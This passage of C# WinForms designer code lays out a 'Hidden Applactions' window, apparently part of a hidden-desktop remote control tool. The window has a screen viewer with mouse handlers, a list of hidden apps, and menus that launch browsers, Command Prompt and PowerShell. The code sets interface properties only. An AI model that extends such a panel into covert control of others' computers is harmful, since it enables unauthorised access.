        this.tableLayoutPanel1.RowCount = 2;
        this.tableLayoutPanel1.RowStyles.Add(new System.Windows.Forms.RowStyle(System.Windows.Forms.SizeType.Percent, 50f));
        this.tableLayoutPanel1.RowStyles.Add(new System.Windows.Forms.RowStyle(System.Windows.Forms.SizeType.Absolute, 20f));
        this.tableLayoutPanel1.RowStyles.Add(new System.Windows.Forms.RowStyle(System.Windows.Forms.SizeType.Absolute, 20f));
        this.tableLayoutPanel1.Size = new System.Drawing.Size(661, 418);
        this.tableLayoutPanel1.TabIndex = 580;
        this.ListWindows.AllowUserToAddRows = false;
        this.ListWindows.AllowUserToDeleteRows = false;
        this.ListWindows.AllowUserToResizeColumns = false;
        this.ListWindows.AllowUserToResizeRows = false;
        dataGridViewCellStyle.BackColor = System.Drawing.Color.FromArgb(247, 248, 249);
        this.ListWindows.AlternatingRowsDefaultCellStyle = dataGridViewCellStyle;
        this.ListWindows.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
        this.ListWindows.AutoSizeColumnsMode = System.Windows.Forms.DataGridViewAutoSizeColumnsMode.Fill;
        this.ListWindows.AutoSizeRowsMode = System.Windows.Forms.DataGridViewAutoSizeRowsMode.AllCells;
        this.ListWindows.BackgroundColor = System.Drawing.Color.White;
        this.ListWindows.BorderStyle = System.Windows.Forms.BorderStyle.None;
        this.ListWindows.CellBorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.SingleHorizontal;
        this.ListWindows.ClipboardCopyMode = System.Windows.Forms.DataGridViewClipboardCopyMode.Disable;
        this.ListWindows.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
        dataGridViewCellStyle2.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
        dataGridViewCellStyle2.BackColor = System.Drawing.Color.FromArgb(232, 234, 237);
        dataGridViewCellStyle2.Font = new System.Drawing.Font("Segoe UI", 10.5f);
        dataGridViewCellStyle2.ForeColor = System.Drawing.Color.Black;
        dataGridViewCellStyle2.SelectionBackColor = System.Drawing.Color.FromArgb(232, 234, 237);
        dataGridViewCellStyle2.SelectionForeColor = System.Drawing.Color.Black;
        dataGridViewCellStyle2.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
        this.ListWindows.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle2;
        this.ListWindows.ColumnHeadersHeight = 30;
        this.ListWindows.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.DisableResizing;
        this.ListWindows.Columns.AddRange(this.Column1, this.dataGridViewTextBoxColumn2, this.Column3, this.Column2, this.Column4);
        this.ListWindows.ContextMenuStrip = this.contextMenuStrip1;
        dataGridViewCellStyle3.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
        dataGridViewCellStyle3.BackColor = System.Drawing.Color.White;
        dataGridViewCellStyle3.Font = new System.Drawing.Font("Segoe UI", 10.5f);
        dataGridViewCellStyle3.ForeColor = System.Drawing.Color.Black;
        dataGridViewCellStyle3.SelectionBackColor = System.Drawing.Color.FromArgb(87, 59, 255);
        dataGridViewCellStyle3.SelectionForeColor = System.Drawing.Color.White;
        dataGridViewCellStyle3.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
        this.ListWindows.DefaultCellStyle = dataGridViewCellStyle3;
        this.ListWindows.EnableHeadersVisualStyles = false;
        this.ListWindows.GridColor = System.Drawing.Color.FromArgb(244, 245, 247);
        this.ListWindows.Location = new System.Drawing.Point(425, 3);
        this.ListWindows.MultiSelect = false;
        this.ListWindows.Name = "ListWindows";
        this.ListWindows.ReadOnly = true;
        this.ListWindows.RowHeadersVisible = false;
        this.ListWindows.RowHeadersWidth = 27;
        this.ListWindows.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
        this.ListWindows.ShowCellErrors = false;
        this.ListWindows.ShowEditingIcon = false;
        this.ListWindows.ShowRowErrors = false;
        this.ListWindows.Size = new System.Drawing.Size(233, 392);
        this.ListWindows.TabIndex = 609;
        this.ListWindows.Theme = Guna.UI2.WinForms.Enums.DataGridViewPresetThemes.Light;
        this.ListWindows.ThemeStyle.AlternatingRowsStyle.BackColor = System.Drawing.Color.FromArgb(247, 248, 249);
        this.ListWindows.ThemeStyle.AlternatingRowsStyle.Font = null;
        this.ListWindows.ThemeStyle.AlternatingRowsStyle.ForeColor = System.Drawing.Color.Empty;
        this.ListWindows.ThemeStyle.AlternatingRowsStyle.SelectionBackColor = System.Drawing.Color.Empty;
        this.ListWindows.ThemeStyle.AlternatingRowsStyle.SelectionForeColor = System.Drawing.Color.Empty;
        this.ListWindows.ThemeStyle.BackColor = System.Drawing.Color.White;
        this.ListWindows.ThemeStyle.GridColor = System.Drawing.Color.FromArgb(244, 245, 247);
        this.ListWindows.ThemeStyle.HeaderStyle.BackColor = System.Drawing.Color.FromArgb(232, 234, 237);
        this.ListWindows.ThemeStyle.HeaderStyle.BorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
        this.ListWindows.ThemeStyle.HeaderStyle.Font = new System.Drawing.Font("Segoe UI", 10.5f);
        this.ListWindows.ThemeStyle.HeaderStyle.ForeColor = System.Drawing.Color.Black;
        this.ListWindows.ThemeStyle.HeaderStyle.HeaightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.DisableResizing;
        this.ListWindows.ThemeStyle.HeaderStyle.Height = 30;
        this.ListWindows.ThemeStyle.ReadOnly = true;
        this.ListWindows.ThemeStyle.RowsStyle.BackColor = System.Drawing.Color.White;
        this.ListWindows.ThemeStyle.RowsStyle.BorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.SingleHorizontal;
        this.ListWindows.ThemeStyle.RowsStyle.Font = new System.Drawing.Font("Segoe UI", 10.5f);
        this.ListWindows.ThemeStyle.RowsStyle.ForeColor = System.Drawing.Color.Black;
        this.ListWindows.ThemeStyle.RowsStyle.Height = 22;
        this.ListWindows.ThemeStyle.RowsStyle.SelectionBackColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.ListWindows.ThemeStyle.RowsStyle.SelectionForeColor = System.Drawing.Color.White;
        this.Column1.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
        this.Column1.HeaderText = "";
        this.Column1.Name = "Column1";
        this.Column1.ReadOnly = true;
        this.Column1.Width = 5;
        this.dataGridViewTextBoxColumn2.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.Fill;
        dataGridViewCellStyle4.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
        this.dataGridViewTextBoxColumn2.DefaultCellStyle = dataGridViewCellStyle4;
        this.dataGridViewTextBoxColumn2.HeaderText = "Apps List Hidden ";
        this.dataGridViewTextBoxColumn2.Name = "dataGridViewTextBoxColumn2";
        this.dataGridViewTextBoxColumn2.ReadOnly = true;
        this.Column3.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
        this.Column3.HeaderText = "Index";
        this.Column3.Name = "Column3";
        this.Column3.ReadOnly = true;
        this.Column3.Width = 65;
        this.Column2.HeaderText = "PID";
        this.Column2.Name = "Column2";
        this.Column2.ReadOnly = true;
        this.Column4.HeaderText = "Path";
        this.Column4.Name = "Column4";
        this.Column4.ReadOnly = true;
        this.contextMenuStrip1.ImageScalingSize = new System.Drawing.Size(20, 20);
        this.contextMenuStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[5] { this.GetScreenWindow, this.RefreshList, this.MuneBrowser, this.MuneApplactions, this.ActiveWindow });
        this.contextMenuStrip1.Name = "contextMenuStrip1";
        this.contextMenuStrip1.Size = new System.Drawing.Size(142, 134);
        this.GetScreenWindow.BackColor = System.Drawing.Color.White;
        this.GetScreenWindow.Image = (System.Drawing.Image)resources.GetObject("GetScreenWindow.Image");
        this.GetScreenWindow.Name = "GetScreenWindow";
        this.GetScreenWindow.Size = new System.Drawing.Size(141, 26);
        this.GetScreenWindow.Text = "Get Screen";
        this.GetScreenWindow.Click += new System.EventHandler(GetScreenWindow_Click);
        this.RefreshList.BackColor = System.Drawing.Color.White;
        this.RefreshList.Image = (System.Drawing.Image)resources.GetObject("RefreshList.Image");
        this.RefreshList.Name = "RefreshList";
        this.RefreshList.Size = new System.Drawing.Size(141, 26);
        this.RefreshList.Text = "Refresh";
        this.RefreshList.Click += new System.EventHandler(RefreshList_Click);
        this.MuneBrowser.BackColor = System.Drawing.Color.White;
        this.MuneBrowser.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[4] { this.MicrosoftEdgeBrowser, this.ChromeBrowser, this.FireFoxBrowser, this.BraveBrowser });
        this.MuneBrowser.Image = (System.Drawing.Image)resources.GetObject("MuneBrowser.Image");
        this.MuneBrowser.Name = "MuneBrowser";
        this.MuneBrowser.Size = new System.Drawing.Size(141, 26);
        this.MuneBrowser.Text = "Browser";
        this.MicrosoftEdgeBrowser.BackColor = System.Drawing.Color.White;
        this.MicrosoftEdgeBrowser.Image = (System.Drawing.Image)resources.GetObject("MicrosoftEdgeBrowser.Image");
        this.MicrosoftEdgeBrowser.Name = "MicrosoftEdgeBrowser";
        this.MicrosoftEdgeBrowser.Size = new System.Drawing.Size(199, 22);
        this.MicrosoftEdgeBrowser.Text = "Microsoft Edge Browser";
        this.MicrosoftEdgeBrowser.Click += new System.EventHandler(MicrosoftEdgeBrowser_Click);
        this.ChromeBrowser.BackColor = System.Drawing.Color.White;
        this.ChromeBrowser.Image = (System.Drawing.Image)resources.GetObject("ChromeBrowser.Image");
        this.ChromeBrowser.Name = "ChromeBrowser";
        this.ChromeBrowser.Size = new System.Drawing.Size(199, 22);
        this.ChromeBrowser.Text = "Chrome Browser";
        this.ChromeBrowser.Click += new System.EventHandler(ChromeBrowser_Click);
        this.FireFoxBrowser.BackColor = System.Drawing.Color.White;
        this.FireFoxBrowser.Image = (System.Drawing.Image)resources.GetObject("FireFoxBrowser.Image");
        this.FireFoxBrowser.Name = "FireFoxBrowser";
        this.FireFoxBrowser.Size = new System.Drawing.Size(199, 22);
        this.FireFoxBrowser.Text = "FireFox Browser";
        this.FireFoxBrowser.Click += new System.EventHandler(FireFoxBrowser_Click);
        this.BraveBrowser.BackColor = System.Drawing.Color.White;
        this.BraveBrowser.Image = (System.Drawing.Image)resources.GetObject("BraveBrowser.Image");
        this.BraveBrowser.Name = "BraveBrowser";
        this.BraveBrowser.Size = new System.Drawing.Size(199, 22);
        this.BraveBrowser.Text = "Brave Browser";
        this.BraveBrowser.Click += new System.EventHandler(BraveBrowser_Click);
        this.MuneApplactions.BackColor = System.Drawing.Color.White;
        this.MuneApplactions.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[3] { this.CommandPrompt, this.PowerShell, this.CustomOpen });
        this.MuneApplactions.Image = (System.Drawing.Image)resources.GetObject("MuneApplactions.Image");
        this.MuneApplactions.Name = "MuneApplactions";
        this.MuneApplactions.Size = new System.Drawing.Size(141, 26);
        this.MuneApplactions.Text = "Applactions";
        this.CommandPrompt.BackColor = System.Drawing.Color.White;
        this.CommandPrompt.Image = (System.Drawing.Image)resources.GetObject("CommandPrompt.Image");
        this.CommandPrompt.Name = "CommandPrompt";
        this.CommandPrompt.Size = new System.Drawing.Size(174, 22);
        this.CommandPrompt.Text = "Command Prompt";
        this.CommandPrompt.Click += new System.EventHandler(CommandPrompt_Click);
        this.PowerShell.BackColor = System.Drawing.Color.White;
        this.PowerShell.Image = (System.Drawing.Image)resources.GetObject("PowerShell.Image");
        this.PowerShell.Name = "PowerShell";
        this.PowerShell.Size = new System.Drawing.Size(174, 22);
        this.PowerShell.Text = "PowerShell";
        this.PowerShell.Click += new System.EventHandler(PowerShell_Click);
        this.CustomOpen.BackColor = System.Drawing.Color.White;
        this.CustomOpen.Image = (System.Drawing.Image)resources.GetObject("CustomOpen.Image");
        this.CustomOpen.Name = "CustomOpen";
        this.CustomOpen.Size = new System.Drawing.Size(174, 22);
        this.CustomOpen.Text = "Custom Open";
        this.CustomOpen.Click += new System.EventHandler(CustomOpen_Click);
        this.ActiveWindow.BackColor = System.Drawing.Color.White;
        this.ActiveWindow.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[3] { this.RestoreWindow, this.RestartWindow, this.CloseWindow });
        this.ActiveWindow.Image = (System.Drawing.Image)resources.GetObject("ActiveWindow.Image");
        this.ActiveWindow.Name = "ActiveWindow";
        this.ActiveWindow.Size = new System.Drawing.Size(141, 26);
        this.ActiveWindow.Text = "Window";
        this.RestoreWindow.BackColor = System.Drawing.Color.White;
        this.RestoreWindow.Image = (System.Drawing.Image)resources.GetObject("RestoreWindow.Image");
        this.RestoreWindow.Name = "RestoreWindow";
        this.RestoreWindow.Size = new System.Drawing.Size(113, 22);
        this.RestoreWindow.Text = "Restore";
        this.RestoreWindow.Click += new System.EventHandler(RestoreWindow_Click);
        this.RestartWindow.BackColor = System.Drawing.Color.White;
        this.RestartWindow.Image = (System.Drawing.Image)resources.GetObject("RestartWindow.Image");
        this.RestartWindow.Name = "RestartWindow";
        this.RestartWindow.Size = new System.Drawing.Size(113, 22);
        this.RestartWindow.Text = "Restart";
        this.RestartWindow.Click += new System.EventHandler(RestartWindow_Click);
        this.CloseWindow.BackColor = System.Drawing.Color.White;
        this.CloseWindow.Image = (System.Drawing.Image)resources.GetObject("CloseWindow.Image");
        this.CloseWindow.Name = "CloseWindow";
        this.CloseWindow.Size = new System.Drawing.Size(113, 22);
        this.CloseWindow.Text = "Close";
        this.CloseWindow.Click += new System.EventHandler(CloseWindow_Click);
        this.Logs.AllowParentOverrides = false;
        this.Logs.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
        this.Logs.AutoEllipsis = false;
        this.Logs.AutoSize = false;
        this.Logs.Cursor = System.Windows.Forms.Cursors.Default;
        this.Logs.CursorType = System.Windows.Forms.Cursors.Default;
        this.Logs.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.Logs.ForeColor = System.Drawing.Color.DarkGray;
        this.Logs.Location = new System.Drawing.Point(3, 401);
        this.Logs.Name = "Logs";
        this.Logs.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.Logs.Size = new System.Drawing.Size(416, 14);
        this.Logs.TabIndex = 604;
        this.Logs.Text = "...";
        this.Logs.TextAlignment = System.Drawing.ContentAlignment.TopLeft;
        this.Logs.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        this.CountWindows.AllowParentOverrides = false;
        this.CountWindows.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
        this.CountWindows.AutoEllipsis = false;
        this.CountWindows.AutoSize = false;
        this.CountWindows.Cursor = System.Windows.Forms.Cursors.Default;
        this.CountWindows.CursorType = System.Windows.Forms.Cursors.Default;
        this.CountWindows.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.CountWindows.ForeColor = System.Drawing.Color.DarkGray;
        this.CountWindows.Location = new System.Drawing.Point(425, 401);
        this.CountWindows.Name = "CountWindows";
        this.CountWindows.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.CountWindows.Size = new System.Drawing.Size(148, 14);
        this.CountWindows.TabIndex = 603;
        this.CountWindows.Text = "Active : 0";
        this.CountWindows.TextAlignment = System.Drawing.ContentAlignment.TopLeft;
        this.CountWindows.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        this.ViewerBox.BackColor = System.Drawing.Color.Black;
        this.ViewerBox.Dock = System.Windows.Forms.DockStyle.Fill;
        this.ViewerBox.Location = new System.Drawing.Point(3, 3);
        this.ViewerBox.Name = "ViewerBox";
        this.ViewerBox.Size = new System.Drawing.Size(416, 392);
        this.ViewerBox.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
        this.ViewerBox.TabIndex = 577;
        this.ViewerBox.TabStop = false;
        this.ViewerBox.MouseDown += new System.Windows.Forms.MouseEventHandler(ViewerBox_MouseDown);
        this.ViewerBox.MouseMove += new System.Windows.Forms.MouseEventHandler(ViewerBox_MouseMove);
        this.ViewerBox.MouseUp += new System.Windows.Forms.MouseEventHandler(ViewerBox_MouseUp);
        this.FormResizeBox1.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
        this.FormResizeBox1.ForeColor = System.Drawing.Color.Empty;
        this.FormResizeBox1.Location = new System.Drawing.Point(664, 533);
        this.FormResizeBox1.Name = "FormResizeBox1";
        this.FormResizeBox1.Size = new System.Drawing.Size(20, 20);
        this.FormResizeBox1.TabIndex = 600;
        this.FormResizeBox1.TargetControl = this;
        this.PanelTitle.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
        this.PanelTitle.BackgroundColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.PanelTitle.BackgroundImage = (System.Drawing.Image)resources.GetObject("PanelTitle.BackgroundImage");
        this.PanelTitle.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
        this.PanelTitle.BorderColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.PanelTitle.BorderRadius = 22;
        this.PanelTitle.BorderThickness = 1;
        this.PanelTitle.Controls.Add(this.LoaderConnect);
        this.PanelTitle.Controls.Add(this.ButtonMune);
        this.PanelTitle.Controls.Add(this.ButtClose);
        this.PanelTitle.Controls.Add(this.ButtionMinimized);
        this.PanelTitle.Controls.Add(this.ButtonMaximized);
        this.PanelTitle.Controls.Add(this.UserIdInfo);
        this.PanelTitle.Controls.Add(this.bunifuLabel1);
        this.PanelTitle.Controls.Add(this.ImageLogo);
        this.PanelTitle.Cursor = System.Windows.Forms.Cursors.SizeAll;
        this.PanelTitle.Location = new System.Drawing.Point(16, 22);
        this.PanelTitle.Name = "PanelTitle";
        this.PanelTitle.ShowBorders = true;
        this.PanelTitle.Size = new System.Drawing.Size(661, 77);
        this.PanelTitle.TabIndex = 596;
        this.LoaderConnect.AllowStylePresets = true;
        this.LoaderConnect.BackColor = System.Drawing.Color.Transparent;
        this.LoaderConnect.CapStyle = Bunifu.UI.WinForms.BunifuLoader.CapStyles.Flat;
        this.LoaderConnect.Color = System.Drawing.Color.FromArgb(87, 59, 255);
        this.LoaderConnect.Colors = new Bunifu.UI.WinForms.Bloom[0];
        this.LoaderConnect.Cursor = System.Windows.Forms.Cursors.Arrow;
        this.LoaderConnect.Customization = "";
        this.LoaderConnect.DashWidth = 0.5f;
        this.LoaderConnect.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.LoaderConnect.Image = null;
        this.LoaderConnect.Location = new System.Drawing.Point(13, 13);
        this.LoaderConnect.Name = "LoaderConnect";
        this.LoaderConnect.NoRounding = false;
        this.LoaderConnect.Preset = Bunifu.UI.WinForms.BunifuLoader.StylePresets.Dashed;
        this.LoaderConnect.RingStyle = Bunifu.UI.WinForms.BunifuLoader.RingStyles.Dashed;
        this.LoaderConnect.ShowText = false;
        this.LoaderConnect.Size = new System.Drawing.Size(56, 50);
        this.LoaderConnect.Speed = 7;
        this.LoaderConnect.TabIndex = 608;
        this.LoaderConnect.Text = "bunifuLoader1";
        this.LoaderConnect.TextPadding = new System.Windows.Forms.Padding(0);
        this.LoaderConnect.Thickness = 6;
        this.LoaderConnect.Transparent = true;
        this.ButtonMune.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
        this.ButtonMune.AutoRoundedCorners = true;
        this.ButtonMune.BackColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButtonMune.BorderRadius = 11;
        this.ButtonMune.CheckedState.BorderColor = System.Drawing.Color.White;
        this.ButtonMune.CheckedState.CustomBorderColor = System.Drawing.Color.White;
        this.ButtonMune.CheckedState.FillColor = System.Drawing.Color.White;
        this.ButtonMune.CheckedState.FillColor2 = System.Drawing.Color.White;
        this.ButtonMune.CheckedState.ForeColor = System.Drawing.Color.White;
        this.ButtonMune.CheckedState.Parent = this.ButtonMune;
        this.ButtonMune.Cursor = System.Windows.Forms.Cursors.Hand;
        this.ButtonMune.CustomImages.Parent = this.ButtonMune;
        this.ButtonMune.FillColor = System.Drawing.Color.White;
        this.ButtonMune.FillColor2 = System.Drawing.Color.White;
        this.ButtonMune.Font = new System.Drawing.Font("Consolas", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
        this.ButtonMune.ForeColor = System.Drawing.SystemColors.InfoText;
        this.ButtonMune.HoverState.Parent = this.ButtonMune;
        this.ButtonMune.Image = Properties.Resources.iconleft;
        this.ButtonMune.ImageSize = new System.Drawing.Size(18, 18);
        this.ButtonMune.Location = new System.Drawing.Point(622, 42);
        this.ButtonMune.Name = "ButtonMune";
        this.ButtonMune.ShadowDecoration.Parent = this.ButtonMune;
        this.ButtonMune.Size = new System.Drawing.Size(24, 24);
        this.ButtonMune.TabIndex = 606;
        this.ButtonMune.Click += new System.EventHandler(ButtonMune_Click);
        this.ButtClose.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
        this.ButtClose.BackColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButtClose.CheckedState.Parent = this.ButtClose;
        this.ButtClose.Cursor = System.Windows.Forms.Cursors.Hand;
        this.ButtClose.CustomImages.Parent = this.ButtClose;
        this.ButtClose.FillColor = System.Drawing.Color.FromArgb(237, 107, 96);
        this.ButtClose.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.ButtClose.ForeColor = System.Drawing.Color.White;
        this.ButtClose.HoverState.BorderColor = System.Drawing.Color.FromArgb(237, 107, 96);
        this.ButtClose.HoverState.CustomBorderColor = System.Drawing.Color.FromArgb(237, 107, 96);
        this.ButtClose.HoverState.FillColor = System.Drawing.Color.FromArgb(237, 107, 96);
        this.ButtClose.HoverState.Parent = this.ButtClose;
        this.ButtClose.Location = new System.Drawing.Point(631, 13);
        this.ButtClose.Name = "ButtClose";
        this.ButtClose.ShadowDecoration.Mode = Guna.UI2.WinForms.Enums.ShadowMode.Circle;
        this.ButtClose.ShadowDecoration.Parent = this.ButtClose;
        this.ButtClose.Size = new System.Drawing.Size(17, 17);
        this.ButtClose.TabIndex = 573;
        this.ButtClose.Click += new System.EventHandler(ButtClose_Click);
        this.ButtionMinimized.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
        this.ButtionMinimized.BackColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButtionMinimized.CheckedState.Parent = this.ButtionMinimized;
        this.ButtionMinimized.Cursor = System.Windows.Forms.Cursors.Hand;
        this.ButtionMinimized.CustomImages.Parent = this.ButtionMinimized;
        this.ButtionMinimized.FillColor = System.Drawing.Color.FromArgb(97, 196, 83);
        this.ButtionMinimized.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.ButtionMinimized.ForeColor = System.Drawing.Color.White;
        this.ButtionMinimized.HoverState.Parent = this.ButtionMinimized;
        this.ButtionMinimized.Location = new System.Drawing.Point(583, 13);
        this.ButtionMinimized.Name = "ButtionMinimized";
        this.ButtionMinimized.ShadowDecoration.Mode = Guna.UI2.WinForms.Enums.ShadowMode.Circle;
        this.ButtionMinimized.ShadowDecoration.Parent = this.ButtionMinimized;
        this.ButtionMinimized.Size = new System.Drawing.Size(17, 17);
        this.ButtionMinimized.TabIndex = 575;
        this.ButtionMinimized.Click += new System.EventHandler(ButtionMinimized_Click);
        this.ButtonMaximized.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
        this.ButtonMaximized.BackColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButtonMaximized.CheckedState.Parent = this.ButtonMaximized;
        this.ButtonMaximized.Cursor = System.Windows.Forms.Cursors.Hand;
        this.ButtonMaximized.CustomImages.Parent = this.ButtonMaximized;
        this.ButtonMaximized.FillColor = System.Drawing.Color.FromArgb(244, 190, 83);
        this.ButtonMaximized.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.ButtonMaximized.ForeColor = System.Drawing.Color.White;
        this.ButtonMaximized.HoverState.Parent = this.ButtonMaximized;
        this.ButtonMaximized.Location = new System.Drawing.Point(607, 13);
        this.ButtonMaximized.Name = "ButtonMaximized";
        this.ButtonMaximized.ShadowDecoration.Mode = Guna.UI2.WinForms.Enums.ShadowMode.Circle;
        this.ButtonMaximized.ShadowDecoration.Parent = this.ButtonMaximized;
        this.ButtonMaximized.Size = new System.Drawing.Size(17, 17);
        this.ButtonMaximized.TabIndex = 574;
        this.ButtonMaximized.Click += new System.EventHandler(ButtonMaximized_Click);
        this.UserIdInfo.AllowParentOverrides = false;
        this.UserIdInfo.AutoEllipsis = false;
        this.UserIdInfo.Cursor = System.Windows.Forms.Cursors.Default;
        this.UserIdInfo.CursorType = System.Windows.Forms.Cursors.Default;
        this.UserIdInfo.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.UserIdInfo.ForeColor = System.Drawing.Color.DarkGray;
        this.UserIdInfo.Location = new System.Drawing.Point(75, 40);
        this.UserIdInfo.Name = "UserIdInfo";
        this.UserIdInfo.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.UserIdInfo.Size = new System.Drawing.Size(10, 15);
        this.UserIdInfo.TabIndex = 572;
        this.UserIdInfo.Text = "--";
        this.UserIdInfo.TextAlignment = System.Drawing.ContentAlignment.TopLeft;
        this.UserIdInfo.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        this.bunifuLabel1.AllowParentOverrides = false;
        this.bunifuLabel1.AutoEllipsis = false;
        this.bunifuLabel1.Cursor = System.Windows.Forms.Cursors.Default;
        this.bunifuLabel1.CursorType = System.Windows.Forms.Cursors.Default;
        this.bunifuLabel1.Font = new System.Drawing.Font("Segoe UI Semibold", 9.75f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
        this.bunifuLabel1.ForeColor = System.Drawing.Color.Black;
        this.bunifuLabel1.Location = new System.Drawing.Point(75, 17);
        this.bunifuLabel1.Name = "bunifuLabel1";
        this.bunifuLabel1.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.bunifuLabel1.Size = new System.Drawing.Size(119, 17);
        this.bunifuLabel1.TabIndex = 571;
        this.bunifuLabel1.Text = "Hidden Applactions";
        this.bunifuLabel1.TextAlignment = System.Drawing.ContentAlignment.TopLeft;
        this.bunifuLabel1.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        this.ImageLogo.BackColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ImageLogo.Image = (System.Drawing.Image)resources.GetObject("ImageLogo.Image");
        this.ImageLogo.Location = new System.Drawing.Point(10, 13);
        this.ImageLogo.Name = "ImageLogo";
        this.ImageLogo.Size = new System.Drawing.Size(59, 50);
        this.ImageLogo.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
        this.ImageLogo.TabIndex = 570;
        this.ImageLogo.TabStop = false;
        this.PanelBottom.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
        this.PanelBottom.BackgroundColor = System.Drawing.Color.Gainsboro;
        this.PanelBottom.BackgroundImage = (System.Drawing.Image)resources.GetObject("PanelBottom.BackgroundImage");
        this.PanelBottom.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
        this.PanelBottom.BorderColor = System.Drawing.Color.White;
        this.PanelBottom.BorderRadius = 30;
        this.PanelBottom.BorderThickness = 1;
        this.PanelBottom.Location = new System.Drawing.Point(170, 548);
        this.PanelBottom.Name = "PanelBottom";
        this.PanelBottom.ShowBorders = true;
        this.PanelBottom.Size = new System.Drawing.Size(358, 25);
        this.PanelBottom.TabIndex = 594;
        this.PanelLeft.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
        this.PanelLeft.BackgroundColor = System.Drawing.Color.Gainsboro;
        this.PanelLeft.BackgroundImage = (System.Drawing.Image)resources.GetObject("PanelLeft.BackgroundImage");
        this.PanelLeft.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
        this.PanelLeft.BorderColor = System.Drawing.Color.White;
        this.PanelLeft.BorderRadius = 30;
        this.PanelLeft.BorderThickness = 1;
        this.PanelLeft.Location = new System.Drawing.Point(-16, 112);
        this.PanelLeft.Name = "PanelLeft";
        this.PanelLeft.ShowBorders = true;
        this.PanelLeft.Size = new System.Drawing.Size(25, 340);
        this.PanelLeft.TabIndex = 593;
        this.PanelTOP.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
        this.PanelTOP.BackgroundColor = System.Drawing.Color.Gainsboro;
        this.PanelTOP.BackgroundImage = (System.Drawing.Image)resources.GetObject("PanelTOP.BackgroundImage");
        this.PanelTOP.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
        this.PanelTOP.BorderColor = System.Drawing.Color.White;
        this.PanelTOP.BorderRadius = 30;
        this.PanelTOP.BorderThickness = 1;
        this.PanelTOP.Location = new System.Drawing.Point(170, -14);
        this.PanelTOP.Name = "PanelTOP";
        this.PanelTOP.ShowBorders = true;
        this.PanelTOP.Size = new System.Drawing.Size(358, 25);
        this.PanelTOP.TabIndex = 592;
